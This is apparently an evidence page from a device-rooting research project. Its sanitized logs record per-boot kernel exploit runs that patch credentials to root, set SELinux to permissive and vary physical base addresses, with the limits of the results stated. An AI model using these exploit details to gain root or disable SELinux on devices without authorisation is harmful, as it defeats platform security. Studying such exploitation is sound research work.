# Root run evidence

Selected sanitized lines from the per-boot root runs. Full captures remain
private. This is evidence of a per-boot credential patch, not a persistent root
system.

Tags: VALIDATED, INFERRED, UNVALIDATED, BLOCKED.

| Run | P0 | Evidence | Result |
|---|---|---|---|
| A, first derived P0 | `0x80828000` | log SHA-256 `e01ca1ab08284a922188b80f40f6924bad82c56f1a657489942d20297ccb15da` | `captured=1`, `uid 2000->0`, `selinux 1->0`, no panic, 56 s |
| B, persistent shell | `0x80720000` | log SHA-256 `02e68755ec30dbe14130025c77663dbcdb1aee98b415718bc6b0fe00128b2260`; reroot log `f5634cc18d72c7042fbc8f9b7897a063753a327f43c0362f0d5e8fcc8c2dc235` | two outer misses then capture on one run; another run one miss then capture; root server |
| C, selective-fd fix | `0x801f0000` | sanitized session transcript, no public raw hash | `captured=1`, `uid 2000->0`, private `su -c id` and abstract ADB tested; under observation |

## Run A

```
cfi op step=4 miscfops-restore-write ret=8 errno=0 captured=1 n=1 reopens=0
root cred patched uid=0/0 sid=1/1
root child result done=1 uid_after=0 setgid=0/0 setuid=0/0 setenforce=0/0
  su=0/38 daemon=-1 wallpaper=0/38 selinux=1->0
pselect route done=1 calls=1 success=1 step=0 errno=0
pipe physrw pid=<redacted> done=1 root=1 kaslr=1 verify=skipped
  uid=2000->0 selinux=1->0 setgid=0 setuid=0
```

Full selected excerpt: [root-success.md](root-success.md).

## Run B

```
pselect cfi miss attempt=1/1 step=2 errno=0; refreshing FOPS page
... second outer miss ...
cfi op step=4 miscfops-restore-write ret=8 errno=0 captured=1 n=1 reopens=0
root cred patched uid=0/0 sid=1/1
root child result done=1 uid_after=0 ... selinux=0->0
pipe physrw ... done=1 root=1 ... uid=2000->0
```

The payload log records two misses before the capture on the persistent-shell
launch. A later run on the same boot captured after one miss. The one-attempt
outer loop is what re-forked the process.

## Run C

```
p0 derived from slide ... p0=80720000
cfi op step=4 miscfops-restore-write ret=8 errno=0 captured=1 n=1 reopens=0
root cred patched uid=0/0 sid=1/1
root child result done=1 uid_after=0 ... selinux=1->0
pipe physrw ... done=1 root=1 ... uid=2000->0
```

The C run is the selective-fd fix. It was re-rooted after the binder panic and
is still under observation. No public raw log hash is claimed.

## Fixed-P0 misses

| Run | P0 used | Result |
|---|---:|---|
| 1 | `0x80000000` | CFI miss; never captured |
| 2 | `0x80200000` | CFI miss; never captured |

Those were wrong physical targets. The loader base is `0x80080000`; see
[p0 derivation](../docs/exploit/p0-derivation.md).

## What this does not prove

- A stable root channel. The server and credential die with the boot.
- Cross-reboot persistence.
- That the selective-fd fix is stable; the watch window is short.
- That the same P0 or offsets apply to another unit.
